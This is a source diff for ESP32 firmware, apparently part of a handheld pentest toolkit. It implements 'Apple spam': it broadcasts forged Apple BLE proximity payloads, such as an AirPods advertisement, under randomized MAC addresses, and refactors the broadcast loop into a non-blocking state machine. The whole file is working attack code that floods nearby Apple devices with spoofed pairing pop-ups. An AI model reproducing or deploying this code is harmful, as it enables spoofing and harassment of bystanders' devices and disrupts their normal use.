@@ -1,14 +1,15 @@
-#if !defined(LITE_VERSION)
 #include "apple_spam.h"
-#include "ble_spam.h"
 #include "core/display.h"
 #include "core/mykeyboard.h"
 #include "core/utils.h"
 #include "esp_mac.h"
 #include <globals.h>
 
+#if !defined(LITE_VERSION)
+
 extern void generateRandomMac(uint8_t *mac);
 
+// Apple payload data
 static const uint8_t data_airpods[] = {0x4C, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa,
                                        0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
@@ -103,6 +104,17 @@ static bool apple_spam_running = false;
 static int current_apple_payload = -1;
 static BLEAdvertising *pAppleAdvertising = nullptr;
 
+// State machine variables
+static enum {
+    APPLE_IDLE,
+    APPLE_ADVERTISING,
+    APPLE_WAITING
+} apple_state = APPLE_IDLE;
+static unsigned long apple_state_start_ms = 0;
+static unsigned long apple_adv_duration_ms = 100;
+static unsigned long apple_burst_interval_ms = 200;
+static bool ble_initialized = false;
+
 int getApplePayloadCount() { return apple_payload_count; }
 
 const char *getApplePayloadName(int index) {
@@ -112,22 +124,36 @@ const char *getApplePayloadName(int index) {
 
 bool isAppleSpamRunning() { return apple_spam_running; }
 
+static bool initBLE() {
+    if (ble_initialized) return true;
+    
+    if (!NimBLEDevice::isInitialized()) {
+        NimBLEDevice::init("");
+    }
+    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
+    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
+    
+    pAppleAdvertising = NimBLEDevice::getAdvertising();
+    if (!pAppleAdvertising) return false;
+    
+    pAppleAdvertising->setMinInterval(32);
+    pAppleAdvertising->setMaxInterval(48);
+    pAppleAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
+    
+    ble_initialized = true;
+    return true;
+}
+
 void stopAppleSpam() {
     if (!apple_spam_running) return;
 
     apple_spam_running = false;
+    apple_state = APPLE_IDLE;
 
-    if (pAppleAdvertising) {
+    if (pAppleAdvertising && pAppleAdvertising->isAdvertising()) {
         pAppleAdvertising->stop();
-        pAppleAdvertising = nullptr;
     }
-
-#if defined(CONFIG_IDF_TARGET_ESP32C5)
-    esp_bt_controller_deinit();
-#else
-    BLEDevice::deinit();
-#endif
-
+    
     current_apple_payload = -1;
 }
 
@@ -174,125 +200,79 @@ void quickAppleSpam(int payloadIndex) {
 
 void startAppleSpamAll() {
     if (apple_spam_running) stopAppleSpam();
-
-    apple_spam_running = true;
-
-    drawMainBorderWithTitle("Spam All Apple");
-    padprintln("");
-    padprintln("Cycling 22 Apple payloads");
-    padprintln("Press ESC to stop");
-
-    int apple_index = 0;
-
-    while (apple_spam_running) {
-        if (check(EscPress)) {
-            stopAppleSpam();
-            returnToMenu = true;
-            break;
-        }
-
-        displayTextLine(String(apple_payloads[apple_index].name) + " " + String(millis() / 1000) + "s");
-
-        uint8_t macAddr[6];
-        generateRandomMac(macAddr);
-        esp_base_mac_addr_set(macAddr);
-
-        BLEDevice::init("");
-        BLEAdvertising *pAdv = BLEDevice::getAdvertising();
-
-        BLEAdvertisementData advertisementData = BLEAdvertisementData();
-        advertisementData.setFlags(0x06);
-
-        uint8_t fullPayload[31];
-        fullPayload[0] = apple_payloads[apple_index].length + 1;
-        fullPayload[1] = 0xFF;
-        memcpy(&fullPayload[2], apple_payloads[apple_index].data, apple_payloads[apple_index].length);
-
-#ifdef NIMBLE_V2_PLUS
-        advertisementData.addData(fullPayload, apple_payloads[apple_index].length + 2);
-#else
-        std::vector<uint8_t> payloadVector(fullPayload, fullPayload + apple_payloads[apple_index].length + 2);
-        advertisementData.addData(payloadVector);
-#endif
-
-        pAdv->setAdvertisementData(advertisementData);
-        pAdv->setScanResponseData(BLEAdvertisementData());
-        pAdv->setMinInterval(32);
-        pAdv->setMaxInterval(48);
-        pAdv->start();
-        vTaskDelay(100 / portTICK_PERIOD_MS);
-        pAdv->stop();
-        vTaskDelay(5 / portTICK_PERIOD_MS);
-
-#if defined(CONFIG_IDF_TARGET_ESP32C5)
-        esp_bt_controller_deinit();
-#else
-        BLEDevice::deinit();
-#endif
-
-        apple_index = (apple_index + 1) % apple_payload_count;
-    }
+    startAppleSpam(0);
 }
 
 void startAppleSpam(int payloadIndex) {
     if (payloadIndex < 0 || payloadIndex >= apple_payload_count) return;
     if (apple_spam_running) stopAppleSpam();
 
+    if (!initBLE()) return;
+
     current_apple_payload = payloadIndex;
     apple_spam_running = true;
+    apple_state = APPLE_ADVERTISING;
+    apple_state_start_ms = millis();
 
     drawMainBorderWithTitle(apple_payloads[payloadIndex].name);
     padprintln("");
     padprintln("Press ESC to stop");
+}
 
-    while (apple_spam_running) {
-        if (check(EscPress)) {
-            stopAppleSpam();
-            returnToMenu = true;
+void updateAppleSpam() {
+    if (!apple_spam_running) return;
+    
+    unsigned long now = millis();
+    
+    switch (apple_state) {
+        case APPLE_ADVERTISING:
+            if (now - apple_state_start_ms >= apple_adv_duration_ms) {
+                if (pAppleAdvertising && pAppleAdvertising->isAdvertising()) {
+                    pAppleAdvertising->stop();
+                }
+                apple_state = APPLE_WAITING;
+                apple_state_start_ms = now;
+            }
             break;
-        }
-
-        uint8_t macAddr[6];
-        generateRandomMac(macAddr);
-        esp_base_mac_addr_set(macAddr);
-
-        BLEDevice::init("");
-        pAppleAdvertising = BLEDevice::getAdvertising();
-
-        BLEAdvertisementData advertisementData = BLEAdvertisementData();
-        advertisementData.setFlags(0x06);
-
-        uint8_t fullPayload[31];
-        fullPayload[0] = apple_payloads[payloadIndex].length + 1;
-        fullPayload[1] = 0xFF;
-        memcpy(&fullPayload[2], apple_payloads[payloadIndex].data, apple_payloads[payloadIndex].length);
-
+            
+        case APPLE_WAITING:
+            if (now - apple_state_start_ms >= apple_burst_interval_ms) {
+                uint8_t macAddr[6];
+                generateRandomMac(macAddr);
+                esp_base_mac_addr_set(macAddr);
+                
+                BLEAdvertisementData advertisementData = BLEAdvertisementData();
+                advertisementData.setFlags(0x06);
+                
+                uint8_t fullPayload[31];
+                fullPayload[0] = apple_payloads[current_apple_payload].length + 1;
+                fullPayload[1] = 0xFF;
+                memcpy(&fullPayload[2], apple_payloads[current_apple_payload].data, 
+                       apple_payloads[current_apple_payload].length);
+                
 #ifdef NIMBLE_V2_PLUS
-        advertisementData.addData(fullPayload, apple_payloads[payloadIndex].length + 2);
+                advertisementData.addData(fullPayload, apple_payloads[current_apple_payload].length + 2);
 #else
-        std::vector<uint8_t> payloadVector(
-            fullPayload, fullPayload + apple_payloads[payloadIndex].length + 2
-        );
-        advertisementData.addData(payloadVector);
+                std::vector<uint8_t> payloadVector(fullPayload, fullPayload + apple_payloads[current_apple_payload].length + 2);
+                advertisementData.addData(payloadVector);
 #endif
-
-        pAppleAdvertising->setAdvertisementData(advertisementData);
-        BLEAdvertisementData scanResponseData = BLEAdvertisementData();
-        pAppleAdvertising->setScanResponseData(scanResponseData);
-        pAppleAdvertising->setMinInterval(32);
-        pAppleAdvertising->setMaxInterval(48);
-        pAppleAdvertising->start();
-        vTaskDelay(100 / portTICK_PERIOD_MS);
-        pAppleAdvertising->stop();
-        vTaskDelay(5 / portTICK_PERIOD_MS);
-
-#if defined(CONFIG_IDF_TARGET_ESP32C5)
-        esp_bt_controller_deinit();
-#else
-        BLEDevice::deinit();
-#endif
-
-        displayTextLine(String(apple_payloads[payloadIndex].name) + " " + String(millis() / 1000) + "s");
+                
+                pAppleAdvertising->setAdvertisementData(advertisementData);
+                pAppleAdvertising->start();
+                
+                displayTextLine(String(apple_payloads[current_apple_payload].name) + " " + String(now / 1000) + "s");
+                apple_state = APPLE_ADVERTISING;
+                apple_state_start_ms = now;
+            }
+            break;
+            
+        default:
+            break;
+    }
+    
+    if (check(EscPress)) {
+        stopAppleSpam();
+        returnToMenu = true;
     }
 }
 
@@ -309,4 +289,5 @@ void appleSubMenu() {
 
     loopOptions(appleOptions, MENU_TYPE_SUBMENU, "Apple Spam");
 }
+
 #endif
